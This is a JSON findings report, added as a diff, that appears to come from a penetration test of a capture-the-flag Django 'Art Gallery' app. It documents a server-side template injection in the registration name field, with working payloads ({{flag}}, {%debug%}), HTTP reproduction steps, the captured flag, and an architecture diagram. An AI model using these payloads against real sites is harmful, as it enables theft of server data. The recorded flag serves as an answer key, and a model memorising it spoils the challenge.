@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:24:07.172606+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "29708835-c443-4e28-abc6-a66ec66897c8",
+      "timestamp": "2026-04-12T22:24:07.172428+00:00",
+      "title": "Server-Side Template Injection (SSTI) in Registration Name Field \u2014 Django Templates",
+      "severity": "critical",
+      "target": "http://172.17.0.1:43315/accounts/register/step1/",
+      "description": "The user-supplied 'name' field in the multi-step registration form is evaluated directly as a Django template string rather than being safely passed as a context variable. The step3 page renders the name inside a <script> tag using DjangoTemplates. An attacker can inject Django template syntax ({% debug %}, {{ flag }}, etc.) to extract sensitive context variables including the application flag. The template context contains a 'flag' variable with the CTF flag.",
+      "evidence": "1. POST name={{7|add:7}} \u2192 alert shows '14' (arithmetic SSTI confirmed)\n2. POST name={%debug%} \u2192 full context dumped including: {'flag': 'flag{98d2361b-f883-4daa-93f7-cb5c91a32c69}'}\n3. POST name={{flag}} \u2192 alert shows 'flag{98d2361b-f883-4daa-93f7-cb5c91a32c69}'\n\nFLAG: flag{98d2361b-f883-4daa-93f7-cb5c91a32c69}",
+      "tool_used": "manual HTTP exploitation",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "1. GET /accounts/register/step1/ to obtain CSRF token\n2. POST name={{flag}}&password=testpassword123 to /accounts/register/step1/\n3. POST email=x@x.com to /accounts/register/step2/\n4. GET /accounts/register/step3/ - flag appears in <script>alert() output",
+        "expected": "flag{98d2361b-f883-4daa-93f7-cb5c91a32c69}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "74fe1a59-f8c4-46b5-a26b-f69cc26b1fb5",
+      "timestamp": "2026-04-12T22:24:15.834111+00:00",
+      "title": "Art Gallery Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Home[\"/\"]\n  Browser --> Step1[\"/accounts/register/step1/\"]\n  Browser --> Login[\"/accounts/login\"]\n  Step1 -->|\"POST name+password\"| Step2[\"/accounts/register/step2/\"]\n  Step2 -->|\"POST email\"| Step3[\"/accounts/register/step3/\"]\n  Step3 -->|\"Renders name as Django template\"| SSTI[\"SSTI Vuln: name evaluated as Template\"]\n  SSTI -->|\"flag context var\"| Flag[\"flag{98d2361b-f883-4daa-93f7-cb5c91a32c69}\"]\n  Step3 -->|\"Subscribe to premium\"| Complete[\"Registration Complete\"]\n  Browser --> Prefs[\"/accounts/preferences/\"]\n  Prefs -->|\"Requires login\"| Login\n  Django[\"Django 4.2.13 WSGIServer\"] --> Home\n  Django --> Step1\n  Django --> Step2\n  Django --> Step3\n  Django --> DB[\"MySQL Database\"]"
+    }
+  ]
+}
